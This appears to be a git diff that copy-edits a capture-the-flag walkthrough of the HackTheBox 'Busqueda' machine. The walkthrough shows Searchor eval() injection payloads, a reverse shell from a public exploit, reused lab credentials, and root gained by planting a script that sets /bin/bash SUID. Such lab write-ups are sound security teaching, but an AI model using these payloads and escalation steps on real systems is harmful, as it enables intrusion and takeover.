@@ -34,10 +34,11 @@ Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
 ## Port 80 (http)
-I added `searcher.htb` in my `/etc/hosts` file and checked the site. This is what the site looks like:
+I added `searcher.htb` to my `/etc/hosts` file and checked the site. This is what the site looks like:
 ![](assets/Pasted%20image%2020241026095230.png)
 
-After looking a bit on the site doing enumeration like directory fuzzing. I noticed the site uses Flask and uses Searchor 2.4.0. Here Searchor 2.4.0 is vulnerable to command injection here.
+After exploring the site and performing enumeration, such as directory fuzzing, I noticed that the site uses Flask and Searchor 2.4.0. Here, Searchor 2.4.0 is vulnerable to command injection.
+
 ### Explanation of the Vulnerability
 In file **`src/sarchor/main.py`** of **`Searchor <= 2.4.2`** there is a function call **`eval()`**:
 ```python
@@ -54,19 +55,18 @@ def search(engine, query, open, copy):
 	  ...
 ```
 
-Which makes it vulnerable to command injection since it isn't sanitized, and we can use following payloads for command injection:
+This makes it vulnerable to command injection since the input isn't sanitized. We can use the following payloads for command injection:
 - `__import__('os').system('<CMD>')`
 - `__import__('os').popen('<CMD>').read()`
 - `etc`
 
 ### PoC & Exploit
-I got a nice little exploit for this here: https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection
+I found a nice little exploit for this here: [Exploit for Searchor 2.4.0 - Arbitrary CMD Injection](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection).
 
-All I did was cloned the repo and ran the `exploit.sh` PoC Script they have gave to us.
-I ran the following command and I had netcat listening on port 1337 as well. 
+All I did was clone the repository and run the `exploit.sh` proof-of-concept script they provided. I ran the following command while also having netcat listening on port 1337.
 ![](assets/Pasted%20image%2020241026100435.png)
 
-After the script executes I see a reverse shell of user `svc` pops up in our listener and we also get our `user.txt` flag here.
+After the script executes, I see a reverse shell of the user `svc` pop up in our listener, and we also obtain our `user.txt` flag.
 
 ![](assets/Pasted%20image%2020241026100554.png)
 
@@ -82,12 +82,14 @@ cat .gitconfig
 	hooksPath = no-hooks
 ```
 
-It reveals that the user is `cody`. And checking the source code of the web app, I found following git config file:
+I looked around the system and found two interesting pieces of information. In `/home/svc`, there is a folder named `.gitconfig`:
 ![](assets/Pasted%20image%2020241026104949.png)
 
-Here credentials is being supplied using url scheme to `gitea.searcher.htb`. I will add this into my `/etc/hosts` and then try to access it. And maybe use the credentials there to find something useful. 
-And yeah `cody:jh1usoih2bkjaspwe92` worked. yay! I found nothing useful in the website though. 
-I did a random `sudo -l` check with the credentials above since the user is cody, the password reuse must be done by the user cody in this case. And yeah! It worked.
+Here, credentials are supplied using the URL scheme to `gitea.searcher.htb`. I will add this to my `/etc/hosts` file and then try to access it. I might use the credentials there to find something useful. 
+
+And yes, `cody:jh1usoih2bkjaspwe92` worked! Yay! However, I didn't find anything useful on the website. 
+
+I performed a random `sudo -l` check with the credentials above, and since the user is Cody, password reuse must be the case for the user Cody in this situation. And yes! It worked.
 ```
 svc@busqueda:/var/www/app/.git$ sudo -l -S
 [sudo] password for svc: jh1usoih2bkjaspwe92
@@ -100,9 +102,9 @@ User svc may run the following commands on busqueda:
     (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
 ```
 
-And we have a possible vector for root as well. But the fact that we can't read the source code to this file. We are restricted to execute permission here.
+And we have a possible vector for root as well. However, the fact that we can't read the source code for this file means we are restricted to execute permission here.
 
-I tried the following test argument which lets us know the allowed argument.
+I tried the following test argument, which lets us know the allowed arguments.
 ```
 svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py test
 <usr/bin/python3 /opt/scripts/system-checkup.py test
@@ -113,24 +115,23 @@ Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)
      full-checkup  : Run a full system checkup
 ```
 
-Using `sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps` lists two container running i.e gitea & mysql.
+Using `sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps` lists two containers running: `gitea` and `mysql`.
 
-We can probably get some sort of credentials from mysql container? We can try using `docker-inspect`.
+We can probably retrieve some sort of credentials from the MySQL container. We can try using `docker inspect`.
 ```
 svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect
 <thon3 /opt/scripts/system-checkup.py docker-inspect
 Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
 ```
 
-We need format & container name in order to inspect the docker. We know the container name but the format. I found this: https://docs.docker.com/engine/cli/formatting/
-Which tells how the formatting works.
+We need the format and the container name in order to inspect the Docker container. We know the container name, but we need the format. I found this: [Docker Formatting Documentation](https://docs.docker.com/engine/cli/formatting/), which explains how the formatting works.
 
-So I ran following (`jq .` is for json formatting learn more about jq [here](https://jqlang.github.io/jq/)):
+So I ran the following command (the `jq .` part is for JSON formatting; learn more about `jq` [here](https://jqlang.github.io/jq/)):
 ```bash
 sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq .
 ```
 
-I also found database password here:
+I also found the database password here:
 ```
 "Env": [
       "USER_UID=115",
@@ -146,11 +147,11 @@ I also found database password here:
     ]
 ```
 
-Not sure how useful the db password might come but let's see.
-I want the instance's ip address. For that I found this formatting in [site](https://docs.docker.com/reference/cli/docker/inspect/#examples): 
+I'm not sure how useful the database password might be, but let's see.  
+I want the instance's IP address. For that, I found this formatting on [this site](https://docs.docker.com/reference/cli/docker/inspect/#examples):
 ![](assets/Pasted%20image%2020241026110824.png)
 
-I will modify it to my use case with the python script like this:
+I will modify it for my use case like this:
 ```bash
 sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .NetworkSettings.Networks}}' mysql_db | jq .
 ```
@@ -179,35 +180,35 @@ Which outputs the following:
 }
 ```
 
-I know the ip, db username, db password so let's try to connect to the mysql database.
+I know the IP address, database username, and database password, so let's try to connect to the MySQL database.
 ```bash
 mysql -h 172.19.0.3 -u gitea -pyuiu1hoiu4i5ho1uh gitea
 ```
 
-I tried to extract all user info but it didn't fit properly in the terminal. 
+I tried to extract all user information, but it didn't fit properly in the terminal.
 ![](assets/Pasted%20image%2020241026112027.png)
 
-So I only tried to show interesting informations so I used the query `SELECT name, email, passwd FROM user;`  and it shows to user's password here. 
+So I only tried to display interesting information, so I used the query `SELECT name, email, passwd FROM user;`, which reveals the user's password here.
 ![](assets/Pasted%20image%2020241026112219.png)
 
-I tried to crack the password but no success. After a while I reused the database password as administrator's password to see if the admin creds and db creds are same. 
-And to my suprise `administrator:yuiu1hoiu4i5ho1uh` worked. And I am in.
+I tried to crack the password but had no success. After a while, I reused the database password as the administrator's password to see if the admin credentials and database credentials were the same. 
 
-There is a private repo in admin profile which is the scripts that we found in `/opt/scripts` file. Since we now have the source code scripts we may try to use it and abuse the script to get root.
+To my surprise, `administrator:yuiu1hoiu4i5ho1uh` worked, and I am in.
+
+There is a private repository in the admin profile, which contains the scripts we found in the `/opt/scripts` directory. Since we now have the source code for these scripts, we may try to use them to exploit the script and gain root access.
 ![](assets/Pasted%20image%2020241026112517.png)
 
-Since we are most interested in `system-checkup.py` since user svc can run it as root. 
-Looking at it's source code and I found something interesting here. The script runs `./full-checkup.sh` when we supply argument `full-checkup`.
+Since we are most interested in `system-checkup.py`, as the user `svc` can run it as root, I looked at its source code and found something interesting. The script runs `./full-checkup.sh` when we supply the argument `full-checkup`.
 ![](assets/Pasted%20image%2020241026112840.png)
 
-If we run the `system-checkup.py` with argument `full-checkup` it prints `"Something went wrong"`. 
+If we run `system-checkup.py` with the argument `full-checkup`, it prints `"Something went wrong"`.
 ![](assets/Pasted%20image%2020241026113105.png)
 
-You may ask why? It's because of the `try-except` being used. It tried to run `./full-checkup.sh` but since the file isn't present in the current directory we are running the script from. 
+You may ask why. It's because of the `try-except` block being used. It attempts to run `./full-checkup.sh`, but since the file isn't present in the current directory from which we are running the script, it fails.
 
-We can try to abuse the `system-checkup.py` script now by making our own `full-checkup.sh` script in `/tmp` and run the command from `/tmp` directory. In our-custom-made script of `full-checkup.sh` I will basically make the `/bin/bash` a suid executable binary so I can easily get root.
+We can now try to exploit the `system-checkup.py` script by creating our own `full-checkup.sh` script in the `/tmp` directory and running the command from there. In our custom-made script `full-checkup.sh`, I will essentially make `/bin/bash` a SUID executable binary so I can easily gain root access.
 
-I made the following script and gave it execute permission.
+I created the following script and granted it execute permission.
 ```
 svc@busqueda:/tmp$ cat full-checkup.sh 
 #!/bin/bash
@@ -215,15 +216,15 @@ svc@busqueda:/tmp$ cat full-checkup.sh
 chmod u+s /bin/bash
 ```
 
-Now I will run the following and we should have our bash binary as suid executable.
+Now I will run the following command, and we should have our bash binary set as a SUID executable.
 ```bash
 sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
 ```
 
 ![](assets/Pasted%20image%2020241026114407.png)
 
-We no more get the `"Something went wrong"` error which means our bash script ran. And we should have root now.
+We no longer receive the `"Something went wrong"` error, which means our bash script ran successfully. We should have root access now.
 ![](assets/Pasted%20image%2020241026114647.png)
 
 # Conclusion
-Thanks for reading my walkthrough. This box was nice. It was part of TJNull's "[NetSecFocus Trophy Room](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#)". 
+Thanks for reading my walkthrough. This box was nice and was part of TJNull's "[NetSecFocus Trophy Room](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#).
